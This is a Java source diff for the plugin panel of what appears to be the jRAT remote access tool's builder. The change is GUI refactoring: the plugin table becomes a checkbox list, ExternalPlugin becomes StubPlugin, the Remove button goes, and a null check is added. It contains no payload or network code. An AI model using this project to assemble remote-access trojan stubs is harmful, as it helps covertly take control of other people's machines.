@@ -12,27 +12,19 @@ import javax.swing.JCheckBox;
 import javax.swing.JFileChooser;
 import javax.swing.JPanel;
 import javax.swing.JScrollPane;
-import javax.swing.JTable;
 import javax.swing.LayoutStyle.ComponentPlacement;
-import javax.swing.table.DefaultTableModel;
 
-import pro.jrat.extensions.ExternalPlugin;
 import pro.jrat.extensions.PluginList;
+import pro.jrat.extensions.StubPlugin;
 import pro.jrat.ui.components.JCheckBoxList;
 import pro.jrat.ui.renderers.table.PluginsTableRenderer;
-
 
 @SuppressWarnings("serial")
 public class PanelBuildPlugins extends JPanel {
 
-	private JTable table;
-	private DefaultTableModel model;
+	private JCheckBoxList table;
 	private PluginList list;
 	private JCheckBox chckbxDoNotLoad;
-
-	public DefaultTableModel getModel() {
-		return model;
-	}
 
 	public PluginList getList() {
 		if (list.plugins.size() == 0) {
@@ -48,54 +40,37 @@ public class PanelBuildPlugins extends JPanel {
 
 		JButton btnAddServerPlugin = new JButton("Add server plugin (Not client)");
 		btnAddServerPlugin.addActionListener(new ActionListener() {
+			@SuppressWarnings("unchecked")
 			public void actionPerformed(ActionEvent arg0) {
 				JFileChooser ch = new JFileChooser();
 				ch.showOpenDialog(null);
 				File file = ch.getSelectedFile();
 				if (file != null) {
 					if (file.isFile() && file.exists() && file.getName().endsWith(".jar")) {
-						ExternalPlugin p = new ExternalPlugin(file.getAbsolutePath(), !chckbxDoNotLoad.isSelected());
+						StubPlugin p = new StubPlugin(file.getAbsolutePath(), !chckbxDoNotLoad.isSelected());
 						list.plugins.add(p);
-						model.addRow(new Object[] { p.name });
+						
+						JCheckBoxList.CheckBoxListModel model = ((JCheckBoxList.CheckBoxListModel)table.getModel());
+						
+						model.items.addElement(model.createEntry(p.name));
+						table.repaint();
 					}
-
 				}
 			}
 		});
 		btnAddServerPlugin.setIcon(new ImageIcon(PanelBuildPlugins.class.getResource("/icons/plugin_add.png")));
 
-		JButton btnRemove = new JButton("Remove");
-		btnRemove.addActionListener(new ActionListener() {
-			public void actionPerformed(ActionEvent arg0) {
-				int row = table.getSelectedRow();
-				if (row != -1) {
-					String n = model.getValueAt(row, 1).toString();
-					// TODO
-					for (ExternalPlugin p : list.plugins) {
-						if (p.name.equals(n)) {
-							list.plugins.remove(p);
-							model.removeRow(row);
-							break;
-						}
-					}
-				}
-			}
-		});
-		btnRemove.setIcon(new ImageIcon(PanelBuildPlugins.class.getResource("/icons/plugin_delete.png")));
-		
 		chckbxDoNotLoad = new JCheckBox("Do not load class");
 		GroupLayout groupLayout = new GroupLayout(this);
 		groupLayout.setHorizontalGroup(
-			groupLayout.createParallelGroup(Alignment.TRAILING)
-				.addGroup(Alignment.LEADING, groupLayout.createSequentialGroup()
+			groupLayout.createParallelGroup(Alignment.LEADING)
+				.addGroup(groupLayout.createSequentialGroup()
 					.addContainerGap()
 					.addGroup(groupLayout.createParallelGroup(Alignment.LEADING)
 						.addGroup(groupLayout.createSequentialGroup()
 							.addGap(10)
 							.addComponent(chckbxDoNotLoad)
-							.addPreferredGap(ComponentPlacement.RELATED, 33, Short.MAX_VALUE)
-							.addComponent(btnRemove)
-							.addPreferredGap(ComponentPlacement.RELATED)
+							.addPreferredGap(ComponentPlacement.RELATED, 120, Short.MAX_VALUE)
 							.addComponent(btnAddServerPlugin))
 						.addComponent(scrollPane, GroupLayout.PREFERRED_SIZE, 428, GroupLayout.PREFERRED_SIZE))
 					.addContainerGap())
@@ -108,29 +83,32 @@ public class PanelBuildPlugins extends JPanel {
 					.addPreferredGap(ComponentPlacement.RELATED)
 					.addGroup(groupLayout.createParallelGroup(Alignment.BASELINE)
 						.addComponent(btnAddServerPlugin)
-						.addComponent(btnRemove)
 						.addComponent(chckbxDoNotLoad))
 					.addContainerGap(20, Short.MAX_VALUE))
 		);
 
 		File[] files = new File("plugins/stubs/").listFiles();
-		
-		Object[] obj = new Object[files.length];
-		
-		for (int i = 0; i < files.length; i++) {
-			obj[i] = files[i].getAbsolutePath();
-			ExternalPlugin p = new ExternalPlugin(files[i].getAbsolutePath(), false);
-			list.plugins.add(p);
+
+		Object[] obj = new Object[] { };
+
+		if (files != null) {
+			obj = new Object[files.length];
+
+			for (int i = 0; i < files.length; i++) {
+				obj[i] = files[i].getAbsolutePath();
+				StubPlugin p = new StubPlugin(files[i].getAbsolutePath(), false);
+				list.plugins.add(p);
+			}
 		}
-		
+
 		table = new JCheckBoxList(obj);
 		table.setRowHeight(25);
 		table.setDefaultRenderer(Object.class, new PluginsTableRenderer());
-		/*table.setModel(model = new DefaultTableModel(new Object[][] {}, new String[] { "Plugin Name" }) {
-			public boolean isCellEditable(int i, int i1) {
-				return false;
-			}
-		});*/
+		/*
+		 * table.setModel(model = new DefaultTableModel(new Object[][] {}, new
+		 * String[] { "Plugin Name" }) { public boolean isCellEditable(int i,
+		 * int i1) { return false; } });
+		 */
 		table.getTableHeader().setReorderingAllowed(false);
 		scrollPane.setViewportView(table);
 		setLayout(groupLayout);
